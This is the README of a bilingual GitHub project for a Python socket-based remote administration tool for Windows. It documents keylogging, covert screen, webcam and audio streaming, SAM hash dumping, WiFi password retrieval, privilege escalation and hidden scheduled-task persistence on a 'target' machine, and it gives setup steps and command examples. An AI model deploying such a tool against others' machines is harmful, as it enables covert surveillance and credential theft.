# 🤖 windows-socket-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

*Advanced Socket-based Remote Administration Tool for Windows*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed use**: Managing your own devices, penetration testing with explicit written consent, educational research
- ❌ **Prohibited use**: Unauthorized access to computer systems, violating privacy laws, any illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🏗️ Architecture](#️-architecture)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security & Encryption](#-security--encryption)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence Mechanisms](#️-persistence-mechanisms)
  - [📡 Share Feature](#-share-feature)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🏗️ Архитектура](#️-архитектура)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность и шифрование](#-безопасность-и-шифрование)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Механизмы персистентности](#️-механизмы-персистентности)
  - [📡 Функция Share](#-функция-share)

---

# English

## 📋 Overview

**Windows Socket Bot** is a comprehensive remote administration tool that provides **full system control** through direct socket connections.

### Key Differences from Telegram Version

| Feature | Telegram Bot | Socket Bot |
|---------|--------------|------------|
| **Communication** | Telegram API | Direct TCP socket |
| **Internet Required** | Yes | No (LAN only) |
| **Session Discovery** | N/A | Auto-scan local network |
| **Multi-client** | Yes (Telegram) | Yes (multiple sessions) |
| **Real-time Share** | No | Screen/Webcam/Audio streaming |
| **Interactive Shell** | No | Yes (cmd/powershell) |
| **File Transfer** | Upload/Download | Upload/Download + Zip |

### Core Capabilities

| Category | Capabilities |
|----------|-------------|
| **System Control** | Reboot, shutdown, hibernate, sleep, logout, process management |
| **File System** | Browse, upload, download, create, delete, hide, unhide, zip |
| **Network** | IP config, route table, ARP cache, netstat, WiFi scanning/passwords |
| **Registry** | Full registry access (create, read, write, delete, enum keys/values) |
| **Group Policy** | Local Group Policy management (machine/user policies) |
| **Services & Tasks** | Windows services and Task Scheduler management |
| **Device Manager** | Device enumeration, driver install/delete, enable/disable/restart |
| **User Interface** | Screenshot, webcam capture, audio recording, mouse/keyboard control |
| **Surveillance** | Keylogger (multilingual EN/RU/UA), clipboard monitoring |
| **Real-time Share** | Screen streaming, webcam streaming, audio streaming → HTML page |
| **Interactive Shell** | Full cmd/powershell with directory navigation |
| **Session Discovery** | Auto-scan local network for active sessions |
| **Persistence** | Services, tasks, startup (registry/folder), environment variables |
| **Security** | User management, app blocking, website blocking, hash dump (SAM/SECURITY) |

## ✨ Features

### Communication Protocol

| Feature | Description |
|---------|-------------|
| 🔌 **Direct Socket** | TCP connection on configurable port |
| 📦 **ZLIB Compression** | All data compressed with wbits=-15, level=9 |
| 🔐 **XOR Encryption** | 16-bit rolling key encryption (SEED-based) |
| 🧵 **Multi-threaded** | ThreadPoolExecutor for parallel operations |
| 🔍 **Auto-discovery** | Scans local /24 subnet for active sessions |
| 📡 **Chunked Transfer** | 256KB chunks with length prefix |

### Share Feature (Real-time Streaming)

| Mode | Description | Output |
|------|-------------|--------|
| `share -s` | Screen streaming | Live PNG frames → HTML |
| `share -w` | Webcam streaming | Live PNG frames → HTML |
| `share -a` | Audio streaming | Live MP3 chunks → HTML |

**How it works:**
1. Client requests `share -s/-w/-a`
2. Server continuously sends frames/chunks
3. Client writes to file and opens HTML page
4. HTML auto-refreshes every second
5. Press `Ctrl+C` to stop

### Interactive Shell

```bash
# Enter cmd
cmd

# Enter powershell
powershell

# Navigate
cd C:\Users

# Execute commands
dir
whoami
ipconfig

# Exit shell
exit
```

### Session Discovery

```python
# Client scans local network for active sessions
found = find_server(ip)

# Output:
id: 0 | session: 192.168.1.100
id: 1 | session: 192.168.1.101

# Connect to session
Enter session id: 0
```

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         SERVER (Target)                          │
├─────────────────────────────────────────────────────────────────┤
│  • Listens on PORT (default: 2022)                               │
│  • Multi-threaded: one thread per client                         │
│  • XOR encryption + ZLIB compression                              │
│  • Full system control API                                        │
└─────────────────────────────────────────────────────────────────┘
                              ↑
                              │ TCP Socket
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                         CLIENT (Controller)                       │
├─────────────────────────────────────────────────────────────────┤
│  • Scans local network for sessions                              │
│  • Connects to selected server                                   │
│  • Interactive command interface                                 │
│  • File download/upload with progress                            │
│  • Real-time share (screen/webcam/audio)                         │
└─────────────────────────────────────────────────────────────────┘
```

### Protocol Flow

```
Client                          Server
  │                               │
  ├────── 0x1155cea24bacb916 ────→│  (Request SEED)
  │←───── SEED (as string) ───────┤
  │                               │
  ├────── 0x7294cc821afdc797 ────→│  (Connect session)
  │←───── 0x7b833a928d167ab6 ────┤
  │                               │
  │←───── Session info ───────────┤
  ├────── 0x628057b78a560e64 ────→│
  │←───── Node\User ──────────────┤
  ├────── 0x3856b3888f50563b ────→│
  │←───── Full system info ───────┤
  │                               │
  │        [Command Loop]          │
  ├────── 0x403d9ff550597db8 ────→│  (Ready for command)
  ├────── Command ────────────────→│
  │←───── Response ───────────────┤
  │                               │
  ├────── "exit" ─────────────────→│  (Close session)
```

## 🚀 Quick Start

### 📋 Prerequisites

- Windows 7/8/10/11
- Python 3.8+
- Administrator rights (for full functionality)

### 📥 Installation

```bash
git clone https://github.com/vk-candpython/windows-socket-bot.git
cd windows-socket-bot
pip install -r requirements.txt
```

### ⚙️ Configuration

**Server (`bot.py`):**

```python
#-------------------------|NECESSARILY|-------------------------#
PORT = 2022                       # Server port
SEED = 12345                      # Encryption seed
PATH = "C:\\ProgramData\\MyBot"   # Installation directory
#-----------------------------|END|-----------------------------#

#-------------------------|OPTIONAL|-------------------------#
BOT_TASK_NAME = "MyBot"           # Task Scheduler name
BOT_TASK_DESCRIPTION = "My Bot"   # Task description
BOT_EXE = True                    # Run as persistent task
#----------------------------|END|---------------------------#
```

**Client (`session.py`):**

```python
PORT = 2022                       # Must match server PORT
```

### 🏃 Run

**Server (on target machine as Administrator):**
```bash
python bot.py
```

**Client (on controller machine):**
```bash
python session.py
```

### 🔍 Session Discovery

```
AUTHOR: Vladislav Khudash

Do you want to find sessions
Yes\No: yes

find for sessions has started [*]

id: 0 | session: 192.168.1.100
id: 1 | session: 192.168.1.105

Enter session id: 0
```

## 📁 File Structure

### Server (`bot.py`)

```
C:\ProgramData\MyBot\               # PATH (hidden)
├── bot.py                          # Main server script
├── mem/                            # Not used (legacy)
├── sys/                            # System files
│   ├── config/                     # Encrypted configs
│   │   └── 0x6e17263f779dce5a      # SEED
│   ├── 0x3b8f1289273df19c          # Restart flag
│   ├── 0x79f2d2686b6da01e          # Autostart entries (encrypted)
│   └── 0x2a47be6d04a14df5          # Keylogger flag
├── tmp/                            # Temporary files
│   ├── 0x1f95051e7493c896          # Blocked apps list
│   └── 0x4b0944084a778666          # Keylogger data
└── share/                          # Uploaded files
```

### Client (`session.py`)

```
session-{ip}/                       # Per-session directory
├── info.txt                        # Server system info
├── downloads/                      # Downloaded files (cat)
├── zip/                            # Downloaded archives (zip)
├── screenshot/                     # Screenshots (screen -s)
├── webcamshot/                     # Webcam captures (webcam)
├── audio/                          # Audio recordings (audio)
└── share/                          # Share streaming files
    ├── index.html                  # Auto-generated HTML
    ├── img.png                     # Screen/Webcam frame
    └── audio.mp3                   # Audio chunk
```

### Data Transfer Protocol

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Original data (string or bytes)                              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. XOR Encryption (if string)                                   │
│    • Rolling key with feedback                                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. ZLIB Compression                                             │
│    • wbits=-15 (raw deflate)                                    │
│    • level=9, memLevel=9                                        │
│    • 256KB chunks                                               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. Chunked Transfer                                             │
│    • 4-byte length prefix (big-endian)                          │
│    • ACK byte after each chunk                                  │
│    • Zero-length chunk signals EOF                              │
└─────────────────────────────────────────────────────────────────┘
```

## 📚 Command Reference

### Core Commands

| Command | Description |
|---------|-------------|
| `help` | Show all commands |
| `clear` | Clear screen |
| `session` | Session information |
| `gethost` | Current host (IP:PORT) |
| `getpid` | Current PID |
| `getuid` | Current user |
| `getsystem` | Get SYSTEM rights |
| `restart` | Restart bot |
| `exit` | Log out |

### Interactive Shell

```bash
# Enter cmd
cmd

# Enter powershell
powershell

# Inside shell:
cd C:\Users
dir
whoami
exit
```

### Share Feature

```bash
# Stream screen
share -s

# Stream webcam
share -w

# Stream audio
share -a

# Press Ctrl+C to stop
```

### File Transfer Examples

```bash
# Download file
cat C:\Users\user\document.pdf

# Upload file
upload C:\local\file.txt

# Zip current directory
zip
```

### System Commands

```bash
# Full system info
systeminfo

# Process list
ps

# Kill process
kill notepad.exe
kill 1234

# Execute command
cmd
powershell
```

### Registry Examples

```bash
# Create key
reg -c HKEY_CURRENT_USER\Software\MyApp -n Settings

# Set value
reg -c HKEY_CURRENT_USER\Software\MyApp -n Version -v "1.0" -t sz

# Get value
reg -g HKEY_CURRENT_USER\Software\MyApp -n Version
```

### User Interface Examples

```bash
# Screenshot
screen -s

# Webcam
webcam

# Record 10 seconds
audio 10

# Move mouse
mouse -x 500 -y 300 -d 1

# Type text
keyboard -t "Hello" -d 1

# Get clipboard
clipboard -g
```

## ⚙️ Configuration

### Server Config (`bot.py`)

```python
PORT = 2022                       # Server port
SEED = 12345                      # Encryption seed (1-65535)
PATH = "C:\\ProgramData\\MyBot"   # Installation directory
BOT_EXE = True                    # Run as persistent task
BOT_TASK_NAME = "MyBot"           # Task Scheduler name
BOT_TASK_DESCRIPTION = "My Bot"   # Task description
```

### Client Config (`session.py`)

```python
PORT = 2022                       # Must match server PORT
```

### Runtime Config Changes

```bash
# View config
config -g

# Change SEED
config SEED -s 54321

# Reset SEED
config -r SEED
```

## 🛡️ Persistence Mechanisms

### 1. Task Scheduler (BOT_EXE=True)

Creates task that runs every minute:
- User: SYSTEM or current user
- Hidden: true
- Priority: highest
- Restarts if failed

### 2. Internal Autostart

```bash
autostart -c name -p C:\app.exe -a "args" -w true
autostart -l
autostart -d name
```

### 3. Windows Startup (Registry)

```bash
startup -c machine MyApp -p C:\app.exe -a none
startup -g
startup -d machine MyApp
```

### 4. Windows Services

```bash
service -c MyService -n "Display" -d "Desc" -p C:\app.exe -a none -m autostart
```

## 📡 Share Feature

### How It Works

1. **Client requests share mode:**
   ```bash
   share -s   # Screen
   share -w   # Webcam
   share -a   # Audio
   ```

2. **Server starts streaming:**
   - Screen: `mss` captures monitor 1, converts to PNG
   - Webcam: `opencv` captures frame, converts to PNG
   - Audio: `sounddevice` records 1-second chunks

3. **Client receives and displays:**
   - Creates `session-{ip}/share/` directory
   - Generates `index.html` with auto-refresh
   - Opens HTML in default browser
   - Continuously updates file with new frames

4. **Stop sharing:**
   - Press `Ctrl+C` in client terminal
   - Client sends stop signal `0x2a44738d62feabcf`

### HTML Template

```html
<html>
<head>
    <meta http-equiv="refresh" content="1">
    <title>{hostname}</title>
</head>
<body>
    <img src="img.png" width="1080">
    <!-- or -->
    <audio controls autoplay>
        <source src="audio.mp3" type="audio/mpeg">
    </audio>
</body>
</html>
```

---

# Русский

## 📋 Обзор

**Windows Socket Bot** — это комплексный инструмент удалённого администрирования, предоставляющий **полный контроль над системой** через прямое сокет-соединение.

### Ключевые отличия от Telegram версии

| Функция | Telegram Bot | Socket Bot |
|---------|--------------|------------|
| **Связь** | Telegram API | Прямой TCP сокет |
| **Интернет** | Требуется | Нет (только LAN) |
| **Поиск сессий** | Н/Д | Авто-сканирование сети |
| **Мульти-клиент** | Да (Telegram) | Да (несколько сессий) |
| **Share в реальном времени** | Нет | Экран/Вебкамера/Аудио |
| **Интерактивная оболочка** | Нет | Да (cmd/powershell) |

## ✨ Возможности

### Коммуникационный протокол

| Функция | Описание |
|---------|----------|
| 🔌 **Прямой сокет** | TCP соединение на настраиваемом порту |
| 📦 **ZLIB сжатие** | Все данные сжимаются с wbits=-15, level=9 |
| 🔐 **XOR шифрование** | 16-битный скользящий ключ (на основе SEED) |
| 🧵 **Многопоточность** | ThreadPoolExecutor для параллельных операций |
| 🔍 **Авто-обнаружение** | Сканирование локальной /24 подсети |
| 📡 **Чанковая передача** | Чанки по 256KB с префиксом длины |

### Функция Share

| Режим | Описание | Вывод |
|-------|----------|-------|
| `share -s` | Стрим экрана | Live PNG кадры → HTML |
| `share -w` | Стрим вебкамеры | Live PNG кадры → HTML |
| `share -a` | Стрим аудио | Live MP3 чанки → HTML |

### Интерактивная оболочка

```bash
# Войти в cmd
cmd

# Войти в powershell
powershell

# Навигация
cd C:\Users

# Выполнение команд
dir
whoami
exit
```

## 🏗️ Архитектура

*(См. английскую версию для диаграммы)*

## 🚀 Быстрый старт

### 📋 Требования

- Windows 7/8/10/11
- Python 3.8+
- Права администратора

### 📥 Установка

```bash
git clone https://github.com/vk-candpython/windows-socket-bot.git
cd windows-socket-bot
pip install -r requirements.txt
```

### ⚙️ Конфигурация

**Сервер (`bot.py`):**
```python
PORT = 2022
SEED = 12345
PATH = "C:\\ProgramData\\MyBot"
```

**Клиент (`session.py`):**
```python
PORT = 2022
```

### 🏃 Запуск

**Сервер:**
```bash
python bot.py
```

**Клиент:**
```bash
python session.py
```

## 📚 Справочник команд

### Share

```bash
# Стрим экрана
share -s

# Стрим вебкамеры
share -w

# Стрим аудио
share -a

# Ctrl+C для остановки
```

### Передача файлов

```bash
# Скачать файл
cat C:\Users\user\document.pdf

# Загрузить файл
upload C:\local\file.txt

# Архив текущей директории
zip
```

### Интерактивная оболочка

```bash
# cmd
cmd

# powershell
powershell

# Внутри оболочки:
cd C:\Users
dir
exit
```

---

<div align="center">

**[⬆ Back to Top](#-windows-socket-bot)**

*Direct Socket Remote Administration — Full Windows Control*

</div>
